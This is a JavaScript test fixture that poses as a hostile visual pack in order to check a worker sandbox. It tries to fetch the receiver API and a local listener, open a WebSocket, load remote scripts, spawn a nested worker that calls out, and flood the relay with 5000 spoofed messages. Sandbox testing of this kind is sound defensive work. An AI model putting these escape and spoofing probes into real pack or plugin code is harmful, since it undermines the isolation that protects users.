// TEST FIXTURE, not a visual pack: a hostile pack stand-in. From where pack code runs (the pack worker), it tries to
// reach the receiver and an outside listener, to escape its worker, and finally to flood the relay with spoofed
// messages. Results are reported through stats() (probe.*). Used by qualification/visual/robustness.qual.js.
// The qualification writes the receiver's port and its outside listener's port here, in a temporary copy.
const RECEIVER_PORT=0,LISTENER_PORT=0;
export function createWorld(sdk){
  const {THREE,scene}=sdk;const results={};let frames=0,done=false,flooded=false,listener=0;
  const mesh=new THREE.Mesh(new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:new THREE.Color('#ff7a5c')}));scene.add(mesh);
  const attempt=async(name,f)=>{try{const r=await f();results[name]=r===undefined?'reached':`reached:${String(r).slice(0,24)}`;}catch(e){results[name]='blocked';}};
  async function probe(){
    const origin=self.location?.origin||'';const base=String(self.location?.href||'');
    results.origin=origin;
    await attempt('fetchReceiver',()=>fetch('/api/projects').then(r=>r.status));
    await attempt('fetchAbsolute',()=>fetch('http://127.0.0.1:'+(RECEIVER_PORT||4174)+'/api/projects').then(r=>r.status));
    if(listener)await attempt('fetchOutside',()=>fetch('http://127.0.0.1:'+listener+'/worker-fetch').then(r=>r.status));
    if(listener)await attempt('websocket',()=>new Promise((res,rej)=>{const w=new WebSocket('ws://127.0.0.1:'+listener+'/ws');w.onopen=()=>res('open');w.onerror=()=>rej(new Error('blocked'));setTimeout(()=>rej(new Error('blocked')),1500);}));
    // Script loading from elsewhere (static checks forbid module imports; the content policy must refuse this at run time).
    if(listener)await attempt('scriptOutside',()=>self.importScripts('http://127.0.0.1:'+listener+'/script.js'));
    await attempt('scriptApi',()=>self.importScripts('/api/projects'));
    await attempt('eval',()=>new Function('return 1')());
    results.document=typeof document==='undefined'?'blocked':'reached';
    results.parentWindow=typeof parent==='undefined'&&typeof window==='undefined'?'blocked':'reached';
    results.webrtc=typeof RTCPeerConnection==='undefined'?'blocked':'reached';
    results.indexedDB=await new Promise(res=>{try{const r=indexedDB.open('probe');r.onsuccess=()=>res('reached');r.onerror=()=>res('blocked');}catch(e){res('blocked');}});
    results.caches=await (async()=>{try{await caches.open('probe');return 'reached';}catch(e){return 'blocked';}})();
    if(listener)await attempt('nestedWorker',()=>new Promise((res,rej)=>{const w=new Worker(URL.createObjectURL(new Blob(['fetch("http://127.0.0.1:'+listener+'/nested").then(()=>postMessage("reached"),()=>postMessage("blocked"))'],{type:'text/javascript'})));
      w.onmessage=e=>e.data==='reached'?res('reached'):rej(new Error('blocked'));w.onerror=()=>rej(new Error('blocked'));setTimeout(()=>rej(new Error('blocked')),2000);}));
    results.navigation=typeof location!=='undefined'&&typeof location.assign==='function'?'reached':'blocked';
    done=true;
  }
  return {
    rebuild(){},
    update(frame){frames++;mesh.rotation.y=frame.tview;if(frames===2){listener=LISTENER_PORT;probe();}
      // Finally, flood the relay with spoofed messages (a well-behaved world never posts messages itself).
      if(done&&!flooded&&frames>=200){flooded=true;for(let i=0;i<5000;i++)self.postMessage({type:'stats',stats:{spoofed:i},labels:['spoofed']});}},
    cameraGoal(){return {target:new THREE.Vector3(),distance:5,azimuth:.6,elevation:.4,fov:40};},
    effect(){},
    stats(){const out={fixtureFrames:frames,probeDone:done};for(const [k,v] of Object.entries(results))out['probe_'+k]=v;return out;},
    dispose(){scene.remove(mesh);mesh.geometry.dispose();mesh.material.dispose();}
  };
}
